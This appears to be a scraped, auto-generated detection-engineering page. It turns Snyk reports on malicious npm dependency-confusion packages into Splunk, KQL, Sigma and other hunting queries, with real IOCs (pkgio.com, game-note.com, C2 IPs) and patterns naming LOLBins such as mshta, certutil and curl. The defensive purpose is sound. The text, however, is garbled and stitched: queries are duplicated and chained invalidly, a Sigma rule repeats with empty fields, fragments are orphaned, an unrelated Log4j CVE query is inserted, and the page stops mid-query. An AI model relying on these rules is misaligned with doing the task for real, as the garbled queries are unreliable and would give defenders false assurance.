Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process

Critical

Snyk finds 200+ malicious npm packages, including Cobalt Strike dependency confusion attacks

Snyk
2022-05-24 6 use cases 4 techniques 7 kill-chain phases detected

Snyk recently discovered overt 200 malicious packages in the npm registry. While we acknowledge that vulnerability fatigue is an issue for developers, this article is not about the typical case of typosquatting or random malicious package. This article shares the findings of targeted attacks aimed at businesses and corporations that Snyk was able to detect and share the insights.

Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).

npm install-time script executing 'node .' postinstall payload AIInstallation Medium
Hunts the dependency-confusion dropper pattern Snyk flagged: a malicious package whose package.json declares "postinstall": "node .", causing npm to spawn node.exe with the directory ('.') as the entrypoint during install. This surfaces install-time code execution from untrusted packages, distinct from normal build steps like webpack. Rationale: Anchored on the exact malicious postinstall string Snyk called out ('node .') plus an npm/yarn/pnpm install parent context, so it fires on supply-chain droppers rather than legit build hooks. Snyk and JFrog independently confirm postinstall JS invocation as the install-time execution vector. Cross-checked against: • https://snyk.io/blog/snyk-200-malicious-npm-packages-cobalt-strike-dependency-confusion-attacks/ • https://jfrog.com/blog/npm-supply-chain-attack-targets-german-based-companies/
ATT&CKT1195.002 T1059.007
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate in-house package whose postinstall runs 'node .' to bootstrap a CLI
  • Developer running 'node .' manually in a project root during local testing
  • Monorepo build tooling (lerna/nx) shelling node into a workspace dir
  • CI runners executing 'node .' as a documented start script
  • Electron/native-module build steps that re-enter node with the cwd
Suppression filter
| where not(InitiatingProcessCommandLine has_any ("lerna","nx run","node_modules\\.bin\\electron"))
Response runbook
Step 1 (triage): Identify the package being installed — capture InitiatingProcessCommandLine and the FolderPath of the node.exe child; check the package name/version against the article's confusion targets (e.g. git-en-boite-core, klook-node-framework) and look for a suspicious major version >=90 (e.g. 99.99.99). Step 2 (contain): If the package is unknown/internal-namespaced from the public registry, isolate the host, kill the node process tree, and quarantine the package tarball from the npm cache. Step 3 (hunt): Pivot to network egress from the same node.exe to pkgio.com (UC2) and search other dev/build hosts for the same package name and SHA256.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName =~ "node.exe"
| where ProcessCommandLine matches regex @"(?i)\bnode(\.exe)?\b\S*\s+\.(\s|$)"
| where InitiatingProcessFileName in~ ("node.exe","npm.cmd","npm.exe","cmd.exe","powershell.exe","yarn.cmd","pnpm.cmd")
   or InitiatingProcessCommandLine has_any ("npm install","npm i ","yarn","pnpm install","node-gyp","preinstall","postinstall")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName endswith @"\node.exe"
| where CommandLine matches regex @"(?i)\bnode(\.exe)?\b\S*\s+\.(\s|$)"
| where ParentProcessName has_any ("node.exe","npm","cmd.exe","powershell.exe","yarn","pnpm")
| where not(SubjectUserName endswith "$")
| project TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc
title: npm postinstall executes 'node .' dropper
id: 2c6f1b84-9d3a-4f21-8b77-3e0d5a1c9f42
description: Detects node.exe invoked with '.' as its sole entrypoint argument under an npm/yarn/pnpm install context, the install-time execution pattern Snyk observed in 200+ malicious dependency-confusion packages.
references:
  - https://snyk.io/blog/snyk-200-malicious-npm-packages-cobalt-strike-dependency-confusion-attacks/
author: SOC Detection Engineering
date: 2026/06/29
tags:
  - attack.t1195.002
  - attack.t1059.007
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    Image|endswith: '\node.exe'
  selection_cmd:
    CommandLine|re: '(?i)\bnode(\.exe)?\b\S*\s+\.(\s|$)'
  selection_parent:
    ParentImage|endswith:
      - '\node.exe'
      - '\npm.cmd'
      - '\cmd.exe'
      - '\powershell.exe'
      - '\yarn.cmd'
      - '\pnpm.cmd'
  condition: selection_img and selection_cmd and selection_parent
level: medium
source:windows.sysmon @EventID:1 @Image:(*\node.exe OR *\Node.exe OR *\NODE.EXE) (@CommandLine:(*node\ .* OR *node.exe\ .*)) @ParentImage:(*\node.exe OR *\npm.cmd OR *\cmd.exe OR *\powershell.exe OR *\yarn.cmd OR *\pnpm.cmd)
#event_simpleName=ProcessRollup2 ImageFileName=/\\node\.exe$/i | CommandLine=/(?i)\bnode(\.exe)?\b\S*\s+\.(\s|$)/ | ParentBaseFileName=/(node\.exe|npm\.cmd|cmd\.exe|powershell\.exe|yarn\.cmd|pnpm\.cmd)/i | groupBy([aid, ComputerName, ImageFileName, CommandLine, ParentBaseFileName], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process_name="node.exe") by Processes.dest Processes.user Processes.process_name Processes.process Processes.parent_process_name Processes.parent_process Processes.process_id | `drop_dm_object_name(Processes)` | regex process="(?i)\bnode(\.exe)?\b\S*\s+\.(\s|$)" | search (parent_process_name IN ("node.exe","npm.cmd","npm.exe","cmd.exe","powershell.exe","yarn.cmd","pnpm.cmd") OR parent_process="*install*") | convert ctime(firstTime) ctime(lastTime)
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process_name="node.exe") by Processes.dest Processes.user Processes.process_name Processes.process Processes.parent_process_name Processes.parent_process Processes.process_id | `drop_dm_object_name(Processes)` | regex process="(?i)\bnode(\.exe)?\b\S*\s+\.(\s|$)" | search (parent_process_name IN ("node.exe","npm.cmd","npm.exe","cmd.exe","powershell.exe","yarn.cmd","pnpm.cmd") OR parent_process="*install*") | convert ctime(firstTime) ctime(lastTime)
npm dropper exfiltration to pkgio.com telemetry server AIexfil High
Hunts the C2/exfiltration leg of Snyk's dependency-confusion campaign: the dropper beacons machine/environment data to its 'telemetry' server hosted by default at www.pkgio.com over HTTPS and DNS. Detects any host (especially a node/npm process) resolving or connecting to pkgio.com. Rationale: pkgio.com / www.pkgio.com is the article's only hard network IOC and is independently confirmed by Snyk's reporting as the dropper's default HTTPS+DNS telemetry/exfil endpoint, making any resolution of it high-fidelity. Covers both DNS and proxy/network egress paths. Cross-checked against: • https://snyk.io/blog/snyk-200-malicious-npm-packages-cobalt-strike-dependency-confusion-attacks/
ATT&CKT1041 T1071.004 T1567
Data sourcesNetwork_Resolution.DNS
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security researcher or red-teamer intentionally detonating a sample and beaconing to pkgio.com in a sandbox
  • Threat-intel/DNS sinkhole or scanner resolving the IOC for enrichment
  • Proxy/DNS-filter appliance pre-resolving the domain for category lookup
  • A benign squatter later registering pkgio.com (verify WHOIS/age before alerting)
Suppression filter
| where not(DeviceName has_any ("sandbox","detonation","malware-lab"))
Response runbook
Step 1 (triage): Confirm the resolving process (ContextImageFileName / InitiatingProcessFileName) — node.exe/npm strongly corroborates the dropper; capture the host and timeframe. Step 2 (contain): Block pkgio.com and www.pkgio.com at DNS/proxy/firewall, isolate the host, and snapshot for forensics before reimage. Step 3 (hunt): Correlate back to UC1 'node .' execution on the same host within minutes, enumerate the offending npm package + version (look for major version >=90 / 99.99.99) from the npm cache, and sweep all dev/build/CI hosts for the same DNS IOC.
let dns = DeviceEvents
    | where Timestamp > ago(30d)
    | where ActionType == "DnsQueryResponse"
    | where RemoteUrl has "pkgio.com" or AdditionalFields has "pkgio.com"
    | project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, Indicator="DNS";
let net = DeviceNetworkEvents
    | where Timestamp > ago(30d)
    | where RemoteUrl has "pkgio.com"
    | project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, Indicator="Network";
union dns, net
| order by Timestamp desc
union isfuzzy=true
(ImDnsActivity | where TimeGenerated > ago(30d) | where DnsQuery has "pkgio.com" | project TimeGenerated, Host=SrcHostname, Src=SrcIpAddr, Indicator="DNS", Detail=DnsQuery),
(DnsEvents | where TimeGenerated > ago(30d) | where Name has "pkgio.com" | project TimeGenerated, Host=Computer, Src=ClientIP, Indicator="DNS", Detail=Name),
(CommonSecurityLog | where TimeGenerated > ago(30d) | where RequestURL has "pkgio.com" or DestinationHostName has "pkgio.com" | project TimeGenerated, Host=SourceHostName, Src=SourceIP, Indicator="Proxy", Detail=coalesce(RequestURL, DestinationHostName))
| order by TimeGenerated desc

     | `drop_dm_object_name(DNS)`]

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`

Auto-generated hunt targeting the specific binaries, paths, registry locations and command-line fragments named in this article. Hunting tier — needs analyst review and environment tuning before promotion to alerting.
ATT&CKT1204.002

// Article-specific bespoke detection — Snyk finds 200+ malicious npm packages, including Cobalt Strike dependency confu
// Hunts the actual binaries / paths / commandline fragments named
// in the article instead of a generic technique-class template.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where (FileName in~ ("node.js"))
| project Timestamp, DeviceName, AccountName, FileName,
          FolderPath, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc

// File-creation events for the named binaries / paths
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType in ("FileCreated","FileModified")
| where (FolderPath has_any ("/tmp/log.out") or FileName in~ ("node.js"))
| project Timestamp, DeviceName, AccountName, FolderPath,
          FileName, ActionType, InitiatingProcessFileName,
          InitiatingProcessCommandLine
| order by Timestamp desc

Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2021-44228", "CVE-2021-45046", "CVE-2021-45105")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2021-44228", "CVE-2021-45046", "CVE-2021-45105")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |

references:
    - https://attack.mitre.org/techniques/T1195/

detection:

            - '\mshta.exe'

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).

2022-04-30 11 use cases 3 techniques 6 kill-chain phases detected

Once in a while we encounter a truly malicious package that has a purpose, means, and is production-ready — this is a story about one found in npm: gxm-reference-web-auth-server.

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] gxm-reference encrypted-payload artifacts written to disk (obfusc/mac/win/lin .enc.js) · Phishing-link click correlated to endpoint execution

Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
npm dropper DNS exfil to pkgio.com / game-note.com (gxm-reference campaign) AICommand & Control High
Hunts the first-stage 'P1' dropper from the gxm-reference-web-auth-server dependency-confusion package, which exfiltrates username/hostname/package-name and NO_PROXY via structured fake-subdomain DNS lookups (<user>.<host>.h.pkgio.com, <pkg>.n.pkgio.com, <NO_PROXY>.p.pkgio.com) so the lookups traverse firewalls to attacker-controlled authoritative DNS. node.exe resolving any *.pkgio.com / *.game-note.com name is the article-specific signal. Rationale: Anchored on pkgio.com (cited in the Snyk article body as the telemetry/exfil domain) plus game-note.com confirmed by JFrog's analysis of the same German-firm campaign; node.exe DNS-resolving these domains is unambiguous dropper activity. Cross-checked against: • https://snyk.io/blog/npm-dependency-confusion-attack-gxm-reference/ • https://jfrog.com/blog/npm-supply-chain-attack-targets-german-based-companies/ • https://www.reversinglabs.com/blog/npm-dependency-confusion-hacks-target-german-firms
ATT&CKT1071.004 T1048 T1082
Data sourcesNetwork_Resolution.DNS
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Malware analyst or red-team replaying the sample in a sandbox VM that has internet egress
  • Threat-intel crawler / URL-detonation appliance proactively resolving the IOC domain
  • Internal DNS sinkhole that still logs the original query name before redirecting
  • Security researcher cloning the package tarball and running npm install on a monitored host
  • Passive-DNS or attack-surface scanner enumerating the domain
Suppression filter
| where not (DeviceName has_any ("SANDBOX","MALWARE-VM","DETONATE"))
Response runbook
1) Triage: confirm the resolving process is node.exe/npm and pull the package being installed (npm-debug log, node_modules path, package.json dependencies for gxm-reference-web-auth-server or gibberish names ldtzstxwzpntxqn/lznfjbhurpjsqmr). Capture the full queried subdomain — it leaks username.hostname. 2) Contain: block *.pkgio.com and *.game-note.com at DNS/proxy, isolate the build/dev host, and quarantine confsettingsaaa.js + *.enc.js artifacts. 3) Hunt: pivot on the host for second-stage C2 to 82.196.7.23 / 82.196.15.238 and HTTP POSTs to /callbackupload, /callbacknode, /updateinfosnodejs; review the org's private-registry config for dependency-confusion exposure.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl endswith ".pkgio.com" or RemoteUrl =~ "pkgio.com" or RemoteUrl endswith ".game-note.com"
| where InitiatingProcessFileName in~ ("node.exe","npm.exe","npm.cmd")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort, InitiatingProcessAccountName
| order by Timestamp desc
DnsEvents
| where TimeGenerated > ago(30d)
| where Name endswith ".pkgio.com" or Name =~ "pkgio.com" or Name endswith ".game-note.com"
| project TimeGenerated, Computer, ClientIP, Name, QueryType, ResultCode
| order by TimeGenerated desc

npm post-install spawns node confsettingsaaa.js (gxm-reference dropper execution) AIInstallation High
Hunts execution of the malicious post-install script from the gxm-reference-web-auth-server package, whose package.json defines "postinstall": "node confsettingsaaa.js". The filename confsettingsaaa.js is a unique, campaign-specific artifact also seen across the Bertelsmann/Bosch/Stihl/DB-Schenker packages, so any process command line referencing it is high-fidelity. Rationale: confsettingsaaa.js is named verbatim in the article's package.json ("postinstall":"node confsettingsaaa.js") and corroborated as a shared artifact across the campaign by JFrog; the filename is unique enough that a command-line substring match alone is alerting-grade. Cross-checked against: • https://snyk.io/blog/npm-dependency-confusion-attack-gxm-reference/ • https://jfrog.com/blog/npm-supply-chain-attack-targets-german-based-companies/
ATT&CKT1195.002 T1059.007
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Reverse-engineer running the sample under instrumentation in a controlled VM
  • SOAR/EDR auto-detonation of a flagged npm tarball
  • Internal training/CTF environment replaying the published IOC
  • Backup or AV scanner re-reading a quarantined copy that re-triggers a process-name index (rare)
Response runbook
1) Triage: identify the parent (npm/node) and the working directory to recover the offending package and version; check package.json for gxm-reference-web-auth-server or sibling gibberish deps. 2) Contain: kill the node process tree, isolate the dev/CI host, and remove the package from the workspace and any shared npm cache. 3) Hunt: look for the paired DNS exfil to *.pkgio.com and file writes of obfusc.enc.js / *.enc.js on the same host, and audit other developers who installed from the same registry resolution path.

gxm-reference encrypted-payload artifacts written to disk (obfusc/mac/win/lin .enc.js) AIDelivery High
Hunts the dropper writing its obfuscated/encrypted second-stage files — confsettingsaaa.js plus the AES-encrypted platform payloads obfusc.enc.js, mac.enc.js, win.enc.js and lin.enc.js — into a node_modules path during npm install. These exact filenames are campaign-specific across the gxm-reference / German-firm packages and rarely collide with benign software. Rationale: The Snyk tarball listing names confsettingsaaa.js and obfusc.enc.js verbatim; JFrog confirms the per-OS variants mac.enc.js/win.enc.js/lin.enc.js for the same campaign — exact filenames make a file-create match alerting-grade with minimal collision risk. Cross-checked against: • https://snyk.io/blog/npm-dependency-confusion-attack-gxm-reference/ • https://jfrog.com/blog/npm-supply-chain-attack-targets-german-based-companies/
ATT&CKT1195.002 T1027 T1140
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Malware researcher unpacking the tarball into a monitored analysis directory
  • AV engine writing a quarantine/restore copy that preserves the original filename
  • Threat-intel sample repository (e.g. cloned git of IOC samples) synced onto an endpoint
  • Developer intentionally retaining the sample for internal write-up
Suppression filter
DeviceFileEvents | where InitiatingProcessFileName in~ ("node.exe","npm.exe","npm.cmd")
Response runbook
1) Triage: confirm the writing process is node.exe/npm and capture the SHA256 of obfusc.enc.js for IOC comparison; map the node_modules path back to the installed package name. 2) Contain: isolate the host, delete the artifact set, and purge the package from the npm cache and any artifact mirror. 3) Hunt: correlate with confsettingsaaa.js execution and *.pkgio.com DNS on the same host; sweep other endpoints for the same five filenames to scope campaign spread across the dev/CI fleet.

gxm-reference second-stage backdoor C2 to 82.196.7.23 / 82.196.15.238 (/callbackupload) AICommand & Control Medium
Hunts the second-stage trojan agent beaconing to the campaign's C2 hosts 82.196.7.23 and 82.196.15.238 (and cdn.game-note.com) over HTTPS to the operator endpoints /callbackupload, /callbacknode and /updateinfosnodejs, which serve the download/upload/eval/exec backdoor commands. This targets the post-recon backdoor channel, distinct from the first-stage DNS exfil. Rationale: C2 IPs 82.196.7.23 / 82.196.15.238, cdn.game-note.com and the unique HTTP endpoints /callbackupload, /callbacknode, /updateinfosnodejs are documented by JFrog for this campaign (DigitalOcean later confirmed the C2 IP to Snyk); dedicated IP/URL-path IOCs make this a low-FP alerting rule. Cross-checked against: • https://jfrog.com/blog/npm-supply-chain-attack-targets-german-based-companies/ • https://snyk.io/blog/npm-dependency-confusion-attack-gxm-reference/ • https://www.reversinglabs.com/blog/npm-dependency-confusion-hacks-target-german-firms
ATT&CKT1071.001 T1105 T1041
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • The DigitalOcean IPs were reassigned after 2022 to an unrelated benign tenant and a host legitimately connects
  • Security scanner / IOC-validation appliance probing the C2 IPs or domain
  • Red-team replay of the published campaign against a sanctioned target
  • Threat-intel platform enriching the indicator by reaching the host
Suppression filter
| where InitiatingProcessFileName in~ ("node.exe","npm.exe")
Response runbook
1) Triage: identify the initiating process (expect node.exe) and confirm a prior gxm-reference dropper footprint (confsettingsaaa.js / *.enc.js / *.pkgio.com DNS) on the same host. 2) Contain: block 82.196.7.23, 82.196.15.238 and *.game-note.com at the perimeter, isolate the host, and capture memory before reimage given eval/exec backdoor capability. 3) Hunt: pull proxy logs for POSTs to /callbackupload, /callbacknode, /register, /updateinfosnodejs across the fleet; review for downloaded/executed payloads (T1105) and any data staged for upload via the C2 channel.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteIP in ("82.196.7.23","82.196.15.238")
   or RemoteUrl has_any ("/callbackupload","/callbacknode","/updateinfosnodejs")
   or RemoteUrl endswith "game-note.com"
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, RemotePort, InitiatingProcessAccountName
| order by Timestamp desc
CommonSecurityLog
| where TimeGenerated > ago(30d)
| where DestinationIP in ("82.196.7.23","82.196.15.238")
   or RequestURL has_any ("/callbackupload","/callbacknode","/updateinfosnodejs")
   or DestinationHostName endswith "game-note.com"
| project TimeGenerated, DeviceVendor, SourceIP, DestinationIP, DestinationHostName, RequestURL, RequestClientApplication, ApplicationProtocol
| order by TimeGenerated desc

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

    by _time span=10s, All_Traffic.src, All_Traffic.dest

| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
